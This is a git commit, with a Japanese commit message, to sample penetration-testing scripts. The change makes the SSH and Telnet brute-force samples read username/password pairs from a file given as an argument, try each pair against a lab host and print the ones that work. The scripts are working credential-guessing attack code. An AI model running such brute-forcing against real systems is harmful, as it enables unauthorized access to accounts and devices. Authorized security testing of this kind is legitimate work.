c35b41e6578e9d5fc8f9affb9f19dee3d62c08a2
kanai <kanai@wide.ad.jp>
2013-11-29 09:51:12 +0900

    サンプルスクリプトが引数のファイルからuser/passの対をもってこれるように変更

--- security/Penetration/sampleSSH.py
+++ security/Penetration/sampleSSH.py
@@ -1,19 +1,35 @@
 #!env python
 # -*- coding: utf-8 -*-                                                          
 import SSHBruteForce
-
-liCandidate = []
-liCandidate.append( ("user", "password") )
-liCandidate.append( ("user2", "password2") )
-liCandidate.append( ("user999", "user999") )
+import sys
 
 t = SSHBruteForce.SSHBruteForce(f_debug = False)
 
 # 対象のホスト名を指定
 t.set_host_name("192.168.100.253")
 
+"""
+以下は静的なテストを埋め込むときのテスト
+liCandidate = []
+liCandidate.append( ("user", "password") )
+liCandidate.append( ("user2", "password2") )
+liCandidate.append( ("user999", "user999") )
 for stUser, stPass in liCandidate:
     print "[Try]: " + stUser
     if t.login(stUser, stPass):
         print "[OK]: " + stPass
 
+"""
+
+"""
+以下は第一引数からUser,Passの対を持ってくるとき
+"""
+if len(sys.argv) == 2:
+    frd = open(sys.argv[1])
+    stLine = frd.readline().strip()
+    while stLine:
+        stUser, stPass = tuple( stLine.split(",") )
+        print "[Try]: " + stUser
+        if t.login(stUser, stPass):
+            print "[OK]: " + stPass
+        stLine = frd.readline().strip()
--- security/Penetration/sampleTelnet.py
+++ security/Penetration/sampleTelnet.py
@@ -1,12 +1,7 @@
 #!env python
 # -*- coding: utf-8 -*-                                                          
 import TelnetBruteForce
-
-liCandidate = []
-liCandidate.append( ("user", "password") )
-liCandidate.append( ("user2", "password2") )
-liCandidate.append( ("user999", "user999") )
-
+import sys
 
 t = TelnetBruteForce.TelnetBruteForce(f_debug = False)
 
@@ -16,7 +11,27 @@ TelnetBruteForce.setNode_Juniper(t)
 # 対象のホスト名を指定
 t.set_host_name("192.168.100.253")
 
+"""
+以下は静的なテストを埋め込むときのテスト
+liCandidate = []
+liCandidate.append( ("user", "password") )
+liCandidate.append( ("user2", "password2") )
+liCandidate.append( ("user999", "user999") )
 for stUser, stPass in liCandidate:
     print "[Try]: " + stUser
     if t.login(stUser, stPass, inFailTimeout = 1):
         print "[OK]: " + stPass 
+"""
+
+"""
+以下は第一引数からUser,Passの対を持ってくるとき
+"""
+if len(sys.argv) == 2:
+    frd = open(sys.argv[1])
+    stLine = frd.readline().strip()
+    while stLine:
+        stUser, stPass = tuple( stLine.split(",") )
+        print "[Try]: " + stUser
+        if t.login(stUser, stPass, inFailTimeout = 1):
+            print "[OK]: " + stPass
+        stLine = frd.readline().strip()
